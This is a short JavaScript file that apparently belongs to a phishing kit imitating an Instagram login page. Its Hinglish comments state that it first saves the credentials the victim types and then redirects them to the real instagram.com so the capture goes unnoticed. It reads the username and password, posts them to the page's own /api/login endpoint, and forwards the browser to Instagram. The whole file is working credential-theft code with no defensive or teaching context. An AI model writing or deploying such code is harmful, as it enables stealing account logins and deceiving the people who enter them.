document.addEventListener('DOMContentLoaded', function() {
    const loginForm = document.getElementById('loginForm');
    
    if (loginForm) {
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                alert('Please fill in all fields');
                return;
            }
            
            const loginBtn = document.querySelector('.login-btn');
            const originalText = loginBtn.textContent;
            loginBtn.textContent = 'Logging in...';
            loginBtn.disabled = true;
            
            try {
                // Pehle credentials save karo
                const response = await fetch('/api/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ 
                        username: username, 
                        password: password 
                    })
                });
                
                const data = await response.json();
                
                if (data.success) {
                    // Credentials save ho gaye, ab redirect karo Instagram par
                    window.location.href = 'https://www.instagram.com';
                } else {
                    alert('Login failed. Please try again.');
                }
                
            } catch (error) {
                console.error('Error:', error);
                alert('An error occurred. Please try again.');
                
            } finally {
                loginBtn.textContent = originalText;
                loginBtn.disabled = false;
            }
        });
    }
});
